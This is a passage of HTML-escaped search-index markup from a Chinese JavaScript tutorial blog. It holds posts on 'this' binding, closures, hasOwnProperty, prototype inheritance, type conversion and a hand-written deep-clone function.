&lt;h3 id=&#34;作为普通函数&#34;&gt;作为普通函数&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;function fn1() {
  console.log(this)
}
fn1() // window
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;使用-call-apply-bind&#34;&gt;使用 call apply bind&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;function fn1() {
  console.log(this)
}
fn1.call({ X:100 })  // {X: 100}

const fn2 = fn1.bind({ x:200 })
fn2()  // {x: 200}
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;作为对象方法被调用&#34;&gt;作为对象方法被调用&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;const zhangsan = {
  name: &#39;zhangsan&#39;,
  sayHi() {
    // this 即当前对象
    console.log(this)
  },
  wait() {
    setTimeout(function() {
      // this === window
      console.log(this)
    })
  }
}
zhangsan.sayHi() // {name: &amp;quot;zhangsan&amp;quot;, sayHi: ƒ, wait: ƒ}
zhangsan.wait() // window
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;箭头函数&#34;&gt;箭头函数&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;const zhangsan = {
  name: &#39;zhangsan&#39;,
  sayHi() {
    // this 即当前对象
    console.log(this)
  },
  wait() {
    setTimeout(() =&amp;gt; {
      // this 即当前对象
      console.log(this)
    })
  }
}
zhangsan.sayHi() // {name: &amp;quot;zhangsan&amp;quot;, sayHi: ƒ, wait: ƒ}
zhangsan.wait() // {name: &amp;quot;zhangsan&amp;quot;, sayHi: ƒ, wait: ƒ}
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;在-class-方法中调用&#34;&gt;在 class 方法中调用&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;class People {
  constructor(name) {
    this.name = name
  }
  sayHi() {
    console.log(this)
  }
}
const zhangsan = new People(&#39;zhangsan&#39;)
zhangsan.sayHi() // zhangsan对象： People {name: &amp;quot;zhangsan&amp;quot;}
&lt;/code&gt;&lt;/pre&gt;
">98-js-14-this指向</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://leecss.com/post/javascript-zuo-yong-yu-he-bi-bao/"" data-c="
          &lt;h2 id=&#34;作用域&#34;&gt;作用域&lt;/h2&gt;
&lt;p&gt;作用域：变量的合法使用范围&lt;br&gt;
全局作用域：在全局可以使用&lt;br&gt;
函数作用域：只能在函数块中使用&lt;br&gt;
块级作用域（ES6新增）：let，const定义的变量有块级作用域{}内部使用&lt;/p&gt;
&lt;h2 id=&#34;自由变量&#34;&gt;自由变量&lt;/h2&gt;
&lt;p&gt;1.一个变量在当前作用域没有定义，但是被使用了&lt;br&gt;
2.向上级作用域，一层一层依次寻找，直到找到为止&lt;br&gt;
3.如果到全局作用域都没找到，则报错：xxx is not defined&lt;/p&gt;
&lt;h2 id=&#34;闭包&#34;&gt;闭包&lt;/h2&gt;
&lt;p&gt;闭包：作用域应用的一种特殊情况&lt;br&gt;
表现：&lt;/p&gt;
&lt;p&gt;函数作为参数被传递&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;// 函数作为参数被传递
function print(fn) {
    const a = 200
    fn()
}
const a = 100
function fn() {
    console.log(a)
}
print(fn) // 100
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;函数作为返回值被返回&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;// 函数作为返回值
function create() {
    const a = 100
    return function () {
        console.log(a)
    }
}

const fn = create()
const a = 200
fn() // 100
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;所有的自由变量的查找，是在函数定义的地方，向上级作用域查找，不是在执行的地方&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&#34;闭包的作用&#34;&gt;闭包的作用&lt;/h2&gt;
&lt;h3 id=&#34;隐藏私有变量&#34;&gt;隐藏私有变量&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;// 闭包隐藏数据，只提供 API
function createCache() {
    const data = {} // 闭包中的数据，被隐藏，不被外界访问
    return {
        set: function (key, val) {
            data[key] = val
        },
        get: function (key) {
            return data[key]
        }
    }
}

const c = createCache()
c.set(&#39;a&#39;, 100)
console.log( c.get(&#39;a&#39;) )


&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;块级作用域&#34;&gt;块级作用域&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;let a
for (let i = 0; i &amp;lt; 10; i++) {
    a = document.createElement(&#39;a&#39;)
    a.innerHTML = i + &#39;&amp;lt;br&amp;gt;&#39;
    a.addEventListener(&#39;click&#39;, function (e) {
        e.preventDefault()
        alert(i)
    })
    document.body.appendChild(a)
}

&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;推荐阅读&#34;&gt;推荐阅读&lt;/h2&gt;
&lt;p&gt;&lt;a href=&#34;http://bonsaiden.github.io/JavaScript-Garden/zh/#function.scopes&#34;&gt;http://bonsaiden.github.io/JavaScript-Garden/zh/#function.scopes&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://bonsaiden.github.io/JavaScript-Garden/zh/#function.closures&#34;&gt;http://bonsaiden.github.io/JavaScript-Garden/zh/#function.closures&lt;/a&gt;&lt;/p&gt;
"> 97-js-13-作用域和闭包</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://leecss.com/post/javascript-object-dui-xiang-fang-fa-hasownproperty/"" data-c="
          &lt;h2 id=&#34;概述&#34;&gt;概述&lt;/h2&gt;
&lt;p&gt;对象实例的&lt;code&gt;hasOwnProperty&lt;/code&gt;方法返回一个布尔值，用于判断某个属性定义在对象自身，还是定义在原型链上。&lt;/p&gt;
&lt;!-- more --&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;Date.hasOwnProperty(&#39;length&#39;) // true
Date.hasOwnProperty(&#39;toString&#39;) // false
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;上面代码表明，&lt;code&gt;Date.length&lt;/code&gt;（构造函数&lt;code&gt;Date&lt;/code&gt;可以接受多少个参数）是&lt;code&gt;Date&lt;/code&gt;自身的属性，&lt;code&gt;Date.toString&lt;/code&gt;是继承的属性。&lt;/p&gt;
&lt;h2 id=&#34;hasownproperty-函数&#34;&gt;&lt;code&gt;hasOwnProperty&lt;/code&gt; 函数&lt;/h2&gt;
&lt;p&gt;为了判断一个对象是否包含&lt;em&gt;自定义&lt;/em&gt;属性而不是原型链上的属性， 我们需要使用继承自 &lt;code&gt;Object.prototype&lt;/code&gt; 的 &lt;code&gt;hasOwnProperty&lt;/code&gt; 方法。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;hasOwnProperty&lt;/code&gt; 是 JavaScript 中唯一一个处理属性但是&lt;strong&gt;不&lt;/strong&gt;查找原型链的函数。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;// 修改Object.prototype
Object.prototype.bar = 1; 
var foo = {goo: undefined};

foo.bar; // 1
&#39;bar&#39; in foo; // true

foo.hasOwnProperty(&#39;bar&#39;); // false
foo.hasOwnProperty(&#39;goo&#39;); // true
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;只有 &lt;code&gt;hasOwnProperty&lt;/code&gt; 可以给出正确和期望的结果，这在遍历对象的属性时会很有用。 &lt;strong&gt;没有&lt;/strong&gt;其它方法可以用来排除原型链上的属性，而不是定义在对象&lt;em&gt;自身&lt;/em&gt;上的属性。&lt;/p&gt;
&lt;h3 id=&#34;hasownproperty-作为属性&#34;&gt;&lt;code&gt;hasOwnProperty&lt;/code&gt; 作为属性&lt;/h3&gt;
&lt;p&gt;JavaScript &lt;strong&gt;不会&lt;/strong&gt;保护 &lt;code&gt;hasOwnProperty&lt;/code&gt; 被非法占用，因此如果一个对象碰巧存在这个属性， 就需要使用&lt;em&gt;外部&lt;/em&gt;的 &lt;code&gt;hasOwnProperty&lt;/code&gt; 函数来获取正确的结果。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;var foo = {
    hasOwnProperty: function() {
        return false;
    },
    bar: &#39;Here be dragons&#39;
};

foo.hasOwnProperty(&#39;bar&#39;); // 总是返回 false

// 使用其它对象的 hasOwnProperty，并将其上下文设置为foo
({}).hasOwnProperty.call(foo, &#39;bar&#39;); // true
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;当检查对象上某个属性是否存在时，&lt;code&gt;hasOwnProperty&lt;/code&gt; 是&lt;strong&gt;唯一&lt;/strong&gt;可用的方法。 同时在使用 &lt;code&gt;for in&lt;/code&gt; loop遍历对象时，推荐&lt;strong&gt;总是&lt;/strong&gt;使用 &lt;code&gt;hasOwnProperty&lt;/code&gt; 方法， 这将会避免原型对象扩展带来的干扰。&lt;/p&gt;
&lt;h2 id=&#34;for-in-循环&#34;&gt;&lt;code&gt;for in&lt;/code&gt; 循环&lt;/h2&gt;
&lt;p&gt;和 &lt;code&gt;in&lt;/code&gt; 操作符一样，&lt;code&gt;for in&lt;/code&gt; 循环同样在查找对象属性时遍历原型链上的所有属性。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;// 修改 Object.prototype
Object.prototype.bar = 1;

var foo = {moo: 2};
for(var i in foo) {
    console.log(i); // 输出两个属性：bar 和 moo
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;由于不可能改变 &lt;code&gt;for in&lt;/code&gt; 自身的行为，因此有必要过滤出那些不希望出现在循环体中的属性， 这可以通过 &lt;code&gt;Object.prototype&lt;/code&gt; 原型上的 &lt;code&gt;hasOwnProperty&lt;/code&gt; 函数来完成。&lt;/p&gt;
&lt;h3 id=&#34;使用-hasownproperty-过滤&#34;&gt;使用 &lt;code&gt;hasOwnProperty&lt;/code&gt; 过滤&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;// foo 变量是上例中的
for(var i in foo) {
    if (foo.hasOwnProperty(i)) {
        console.log(i);
    }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这个版本的代码是唯一正确的写法。由于我们使用了 &lt;code&gt;hasOwnProperty&lt;/code&gt;，所以这次&lt;strong&gt;只&lt;/strong&gt;输出 &lt;code&gt;moo&lt;/code&gt;。 如果不使用 &lt;code&gt;hasOwnProperty&lt;/code&gt;，则这段代码在原生对象原型（比如 &lt;code&gt;Object.prototype&lt;/code&gt;）被扩展时可能会出错。&lt;/p&gt;
&lt;p&gt;一个广泛使用的类库 &lt;a href=&#34;http://www.prototypejs.org/&#34;&gt;Prototype&lt;/a&gt; 就扩展了原生的 JavaScript 对象。 因此，当这个类库被包含在页面中时，不使用 &lt;code&gt;hasOwnProperty&lt;/code&gt; 过滤的 &lt;code&gt;for in&lt;/code&gt; 循环难免会出问题。&lt;/p&gt;
&lt;h2 id=&#34;转载&#34;&gt;转载&lt;/h2&gt;
&lt;p&gt;&lt;a href=&#34;http://bonsaiden.github.io/JavaScript-Garden/zh/#object.hasownproperty&#34;&gt;JavaScript秘密花园&lt;/a&gt;&lt;/p&gt;
">96-js-12-Object对象方法hasOwnProperty</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://leecss.com/post/javascript-yuan-xing-lian/"" data-c="
          &lt;h1 id=&#34;95-js-11-原型链&#34;&gt;95-js-11-原型链&lt;/h1&gt;
&lt;h2 id=&#34;概述&#34;&gt;概述&lt;/h2&gt;
&lt;p&gt;简单的回顾一下构造函数、原型和实例的关系：每个构造函数都有一个原型对象，原型对象都包含一个指向构造函数的指针，而实例都包含一个指向原型对象的内部指针。那么假如我们让原型对象等于另一个类型的实例，结果会怎样？显然，此时的原型对象将包含一个指向另一个原型的指针，相应地，另一个原型中也包含着一个指向另一个构造函数的指针。假如另一个原型又是另一个类型的实例，那么上述关系依然成立。如此层层递进，就构成了实例与原型的链条。这就是所谓的原型链的基本概念。——摘自《javascript高级程序设计》&lt;/p&gt;
&lt;p&gt;当谈到继承时，JavaScript 只有一种结构：对象。每个实例对象（object）都有一个私有属性（称之为 &lt;strong&gt;proto&lt;/strong&gt; ）指向它的构造函数的原型对象（&lt;strong&gt;prototype&lt;/strong&gt;）。该原型对象也有一个自己的原型对象（&lt;strong&gt;proto&lt;/strong&gt;），层层向上直到一个对象的原型对象为 &lt;code&gt;null&lt;/code&gt;。根据定义，&lt;code&gt;null&lt;/code&gt; 没有原型，并作为这个&lt;strong&gt;原型链&lt;/strong&gt;中的最后一个环节。&lt;/p&gt;
&lt;h2 id=&#34;推荐阅读&#34;&gt;推荐阅读&lt;/h2&gt;
&lt;p&gt;&lt;a href=&#34;https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Inheritance_and_the_prototype_chain&#34;&gt;MDN-prototype_chain&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://wangdoc.com/javascript/oop/prototype.html&#34;&gt;阮一峰&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.cnblogs.com/loveyaxin/p/11151586.html&#34;&gt;cn&lt;/a&gt;&lt;/p&gt;
">95-js-11-原型链</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://leecss.com/post/javascript-yuan-xing/"" data-c="
          &lt;h2 id=&#34;概述&#34;&gt;概述&lt;/h2&gt;
&lt;p&gt;继承的实现和js的原型&lt;/p&gt;
&lt;h2 id=&#34;类&#34;&gt;类&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;// 类
class Student {
    constructor(name, number) {
        this.name = name
        this.number = number
    }
    sayHi() {
        console.log(
            `姓名 ${this.name} ，学号 ${this.number}`
        )
    }
}

// 通过类 new 对象/实例
const xialuo = new Student(&#39;夏洛&#39;, 100)
console.log(xialuo.name)
console.log(xialuo.number)
xialuo.sayHi()

const madongmei = new Student(&#39;马冬梅&#39;, 101)
console.log(madongmei.name)
console.log(madongmei.number)
madongmei.sayHi()

&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;用类实现继承&#34;&gt;用类实现继承&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;// 父类
class People {
    constructor(name) {
        this.name = name
    }
    eat() {
        console.log(`${this.name} eat something`)
    }
}

// 子类
class Student extends People {
    constructor(name, number) {
        super(name)
        this.number = number
    }
    sayHi() {
        console.log(`姓名 ${this.name} 学号 ${this.number}`)
    }
}

// 子类
class Teacher extends People {
    constructor(name, major) {
        super(name)
        this.major = major
    }
    teach() {
        console.log(`${this.name} 教授 ${this.major}`)
    }
}

// 实例
const xialuo = new Student(&#39;夏洛&#39;, 100)
console.log(xialuo.name)
console.log(xialuo.number)
xialuo.sayHi()
xialuo.eat()

// 实例
const wanglaoshi = new Teacher(&#39;王老师&#39;, &#39;语文&#39;)
console.log(wanglaoshi.name)
console.log(wanglaoshi.major)
wanglaoshi.teach()
wanglaoshi.eat()

&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;原型关系&#34;&gt;原型关系&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;// class实际上是函数，可见是语法糖
typeof People // &#39;function&#39;
typeof Student // &#39;function&#39;

// 隐式原型和显式原型
console.log(xialuo.__proto__)
/**
 * People
 *  constructor: class Student
 *  sayHi: ƒ sayHi()
 *  [[Prototype]]: Object
*/
console.log(Student.prototype)
/**
 * People
 *  constructor: class Student
 *  sayHi: ƒ sayHi()
 *  [[Prototype]]: Object
*/
console.log(xialuo.__proto__ === Student.prototype) // true
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;每个class都有显式原型 prototype&lt;br&gt;
每个实例都有隐式原型 &lt;code&gt;__proto__&lt;/code&gt;&lt;br&gt;
实例的隐式原型 &lt;code&gt;__proto__&lt;/code&gt; 指向class的显式原型prototype&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://leecss.com/post-images/1630195055419.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h2 id=&#34;基于原型的执行规则&#34;&gt;基于原型的执行规则&lt;/h2&gt;
&lt;p&gt;获取属性xialuo.name 或执行方法xialuo.sayhi()时&lt;/p&gt;
&lt;p&gt;先在自身属性和方法找&lt;/p&gt;
&lt;p&gt;如果找不到则去&lt;code&gt;__proto__&lt;/code&gt;中找&lt;/p&gt;
&lt;h2 id=&#34;执行原型上的方法&#34;&gt;执行原型上的方法&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;xialuo.__proto__.sayHi()
// 输出 undefined。 因为原型上没有相应的属性
xialuo.sayHi()
// 执行类似于 xialuo.__proto__.sayHi.call(xialuo)
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;原型链&#34;&gt;原型链&lt;/h2&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://leecss.com/post-images/1630196768351.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
">94-js-10-继承和原型</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://leecss.com/post/javascript-lei-xing-zhuan-huan/"" data-c="
          &lt;h2 id=&#34;概述&#34;&gt;概述&lt;/h2&gt;
&lt;p&gt;显式转化类型&lt;/p&gt;
&lt;h2 id=&#34;分类&#34;&gt;分类&lt;/h2&gt;
&lt;h3 id=&#34;数字转字符串&#34;&gt;数字转字符串&lt;/h3&gt;
&lt;h4 id=&#34;一元的加号操作符&#34;&gt;一元的加号操作符&lt;/h4&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;&#39;&#39; + 10 === &#39;10&#39;; // true
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;tostring&#34;&gt;toString()&lt;/h4&gt;
&lt;p&gt;语法：&lt;code&gt;number.toString(radix)&lt;/code&gt;&lt;br&gt;
radix：规定表示数字的基数，是 2 ~ 36 之间的整数。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;var num = 15;
var a = num.toString(); // 15
var b = num.toString(2); // 1111
var c = num.toString(8); // 17
var d = num.toString(16); // f
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;字符串转数字&#34;&gt;字符串转数字&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;+&#39;010&#39; === 10
Number(&#39;010&#39;) === 10
parseInt(&#39;010&#39;, 10) === 10  // 用来转换为整数

+&#39;010.2&#39; === 10.2
Number(&#39;010.2&#39;) === 10.2
parseInt(&#39;010.2&#39;, 10) === 10
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;一元的加号操作符-2&#34;&gt;一元的加号操作符&lt;/h4&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;+&#39;10&#39; === 10; // true
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;parseint&#34;&gt;parseInt()&lt;/h4&gt;
&lt;p&gt;语法：&lt;code&gt;parseInt(string, radix)&lt;/code&gt;&lt;br&gt;
string：要被解析的字符串；&lt;br&gt;
radix：表示要解析的数字的基数。该值介于 2 ~ 36 之间。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;parseInt(&amp;quot;10&amp;quot;);         //返回 10
parseInt(&amp;quot;19&amp;quot;,10);      //返回 19 (10+9)
parseInt(&amp;quot;11&amp;quot;,2);       //返回 3 (2+1)
parseInt(&amp;quot;17&amp;quot;,8);       //返回 15 (8+7)
parseInt(&amp;quot;1f&amp;quot;,16);      //返回 31 (16+15)
parseInt(&amp;quot;010&amp;quot;);        //未定：返回 10 或 8
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;number&#34;&gt;Number()&lt;/h4&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;Number(&#39;010&#39;) === 10
Number(&#39;010.2&#39;) === 10.2
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;其他类型转布尔值&#34;&gt;其他类型转布尔值&lt;/h3&gt;
&lt;h4 id=&#34;&#34;&gt;!!&lt;/h4&gt;
&lt;p&gt;通过使用 &lt;strong&gt;否&lt;/strong&gt; 操作符两次，可以把一个值转换为布尔型。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;!!&#39;foo&#39;;   // true
!!&#39;&#39;;      // false
!!&#39;0&#39;;     // true
!!&#39;1&#39;;     // true
!!&#39;-1&#39;     // true
!!{};      // true
!!true;    // true
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;boolean&#34;&gt;Boolean()&lt;/h4&gt;
&lt;p&gt;除了undefined、null、0、-0、NaN、&#39;&#39;会被转换成false，其他的值都会转换成true。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;let a = Boolean(null); // false
&lt;/code&gt;&lt;/pre&gt;
">93-js-9-类型转换</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://leecss.com/post/js-shou-xie-shen-kao-bei/"" data-c="
          &lt;h2 id=&#34;概述&#34;&gt;概述&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;什么是深拷贝？&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;浅拷贝(Shallow Copy)、深拷贝(Deep Copy)只存在于&lt;em&gt;引用类型&lt;/em&gt;中 (基本数据类型是按值访问的，操作保存的是实际的值)&lt;br&gt;
&lt;strong&gt;区别&lt;/strong&gt;：是否是真正获取了一个对象的复制实体，而不是引用。&lt;br&gt;
&lt;strong&gt;赋值&lt;/strong&gt;： 只复制了指向对象的指针，改变对象会互相影响。&lt;br&gt;
&lt;strong&gt;浅拷贝&lt;/strong&gt;： 只复制对象一层，改变引用对象还会互相影响。&lt;br&gt;
&lt;strong&gt;深拷贝&lt;/strong&gt;： 完全复制对象的值，改变对象不会互相影响。&lt;/p&gt;
&lt;p&gt;基本类型： Boolean、Number、String、Null、Undefined、Symbol、BigInt&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;var num1 = 1;
var num2 = num1;
// num1: 1
// num2: 1
num2 = 2;
// num1: 1
// num2: 2
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;引用类型： Object&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;var obj1 = {x: 1, y: 2};
var obj2 = obj1;
// obj1: {x: 1, y: 2}
// obj2: {x: 1, y: 2}
obj2.x = 2;
// obj1: {x: 2, y: 2}
// obj2: {x: 2, y: 2}
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;简易版&#34;&gt;简易版&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;/**
 * 深拷贝
 */

const obj1 = {
    age: 20,
    name: &#39;xxx&#39;,
    address: {
        city: &#39;beijing&#39;
    },
    arr: [&#39;a&#39;, &#39;b&#39;, &#39;c&#39;]
}

const obj2 = deepClone(obj1)
obj2.address.city = &#39;shanghai&#39;
obj2.arr[0] = &#39;a1&#39;
console.log(obj1.address.city)
console.log(obj1.arr[0])

/**
 * 深拷贝
 * @param {Object} obj 要拷贝的对象
 */
function deepClone(obj = {}) {
    if (typeof obj !== &#39;object&#39; || obj == null) {
        // obj 是 null ，或者不是对象和数组，直接返回
        return obj
    }

    // 初始化返回结果
    let result
    if (obj instanceof Array) {
        result = []
    } else {
        result = {}
    }

    for (let key in obj) {
        // 保证 key 不是原型的属性
        if (obj.hasOwnProperty(key)) {
            // 递归调用！！！
            result[key] = deepClone(obj[key])
        }
    }

    // 返回结果
    return result
}

&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;深入版&#34;&gt;深入版&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;const mapTag = &#39;[object Map]&#39;;
const setTag = &#39;[object Set]&#39;;
const arrayTag = &#39;[object Array]&#39;;
const objectTag = &#39;[object Object]&#39;;
const argsTag = &#39;[object Arguments]&#39;;

const boolTag = &#39;[object Boolean]&#39;;
const dateTag = &#39;[object Date]&#39;;
const numberTag = &#39;[object Number]&#39;;
const stringTag = &#39;[object String]&#39;;
const symbolTag = &#39;[object Symbol]&#39;;
const errorTag = &#39;[object Error]&#39;;
const regexpTag = &#39;[object RegExp]&#39;;
const funcTag = &#39;[object Function]&#39;;

const deepTag = [mapTag, setTag, arrayTag, objectTag, argsTag];


function forEach(array, iteratee) {
    let index = -1;
    const length = array.length;
    while (++index &amp;lt; length) {
        iteratee(array[index], index);
    }
    return array;
}

function isObject(target) {
    const type = typeof target;
    return target !== null &amp;amp;&amp;amp; (type === &#39;object&#39; || type === &#39;function&#39;);
}

function getType(target) {
    return Object.prototype.toString.call(target);
}

function getInit(target) {
    const Ctor = target.constructor;
    return new Ctor();
}

function cloneSymbol(targe) {
    return Object(Symbol.prototype.valueOf.call(targe));
}

function cloneReg(targe) {
    const reFlags = /\w*$/;
    const result = new targe.constructor(targe.source, reFlags.exec(targe));
    result.lastIndex = targe.lastIndex;
    return result;
}

function cloneFunction(func) {
    const bodyReg = /(?&amp;lt;={)(.|\n)+(?=})/m;
    const paramReg = /(?&amp;lt;=\().+(?=\)\s+{)/;
    const funcString = func.toString();
    if (func.prototype) {
        const param = paramReg.exec(funcString);
        const body = bodyReg.exec(funcString);
        if (body) {
            if (param) {
                const paramArr = param[0].split(&#39;,&#39;);
                return new Function(...paramArr, body[0]);
            } else {
                return new Function(body[0]);
            }
        } else {
            return null;
        }
    } else {
        return eval(funcString);
    }
}

function cloneOtherType(targe, type) {
    const Ctor = targe.constructor;
    switch (type) {
        case boolTag:
        case numberTag:
        case stringTag:
        case errorTag:
        case dateTag:
            return new Ctor(targe);
        case regexpTag:
            return cloneReg(targe);
        case symbolTag:
            return cloneSymbol(targe);
        case funcTag:
            return cloneFunction(targe);
        default:
            return null;
    }
}

function clone(target, map = new WeakMap()) {

    // 克隆原始类型
    if (!isObject(target)) {
        return target;
    }

    // 初始化
    const type = getType(target);
    let cloneTarget;
    if (deepTag.includes(type)) {
        cloneTarget = getInit(target, type);
    } else {
        return cloneOtherType(target, type);
    }

    // 防止循环引用
    if (map.get(target)) {
        return map.get(target);
    }
    map.set(target, cloneTarget);

    // 克隆set
    if (type === setTag) {
        target.forEach(value =&amp;gt; {
            cloneTarget.add(clone(value, map));
        });
        return cloneTarget;
    }

    // 克隆map
    if (type === mapTag) {
        target.forEach((value, key) =&amp;gt; {
            cloneTarget.set(key, clone(value, map));
        });
        return cloneTarget;
    }

    // 克隆对象和数组
    const keys = type === arrayTag ? undefined : Object.keys(target);
    forEach(keys || target, (value, key) =&amp;gt; {
        if (keys) {
            key = value;
        }
        cloneTarget[key] = clone(target[key], map);
    });

    return cloneTarget;
}

module.exports = {
    clone
};

&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;推荐阅读&#34;&gt;推荐阅读&lt;/h2&gt;
&lt;p&gt;&lt;a href=&#34;http://www.conardli.top/blog/article/JS%E8%BF%9B%E9%98%B6/%E5%A6%82%E4%BD%95%E5%86%99%E5%87%BA%E4%B8%80%E4%B8%AA%E6%83%8A%E8%89%B3%E9%9D%A2%E8%AF%95%E5%AE%98%E7%9A%84%E6%B7%B1%E6%8B%B7%E8%B4%9D.html&#34;&gt;如何写出一个惊艳面试官的深拷贝&lt;/a&gt;&lt;/p&gt;
">92-js-8-手写深拷贝</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://leecss.com/post/javascript-yin-shi-lei-xing-zhuan-huan/"" data-c="
          &lt;h2 id=&#34;概述&#34;&gt;概述&lt;/h2&gt;
&lt;p&gt;类型转换分为两种，隐式转换即程序自动进行的类型转换，强制转换即我们手动进行的类型转换。&lt;/p&gt;
&lt;h2 id=&#34;隐式转换&#34;&gt;隐式转换&lt;/h2&gt;
&lt;h3 id=&#34;类型转换规则&#34;&gt;类型转换规则&lt;/h3&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://leecss.com/post-images/1629968151232.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h3 id=&#34;if语句和逻辑运算&#34;&gt;if语句和逻辑运算&lt;/h3&gt;
&lt;h4 id=&#34;turly变量和falsely变量&#34;&gt;turly变量和falsely变量&lt;/h4&gt;
&lt;p&gt;turly变量：&lt;code&gt;!!a===true&lt;/code&gt;的变量&lt;/p&gt;
&lt;p&gt;falsely变量：&lt;code&gt;!!a===false&lt;/code&gt;的变量&lt;/p&gt;
&lt;h4 id=&#34;falsely变量&#34;&gt;falsely变量&lt;/h4&gt;
&lt;p&gt;以下是falsely变量，除此以外都是truly变量&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;0
NaN
&#39;&#39;
null
undefined
false
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;即&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;!!0 === false
!!NaN === false
!!&#39;&#39; === false
!!null === false
!!undefined === false
!!false === false
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;if语句&#34;&gt;if语句&lt;/h4&gt;
&lt;p&gt;if语句中判断的就是turly变量和falsely变量&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;// truly变量
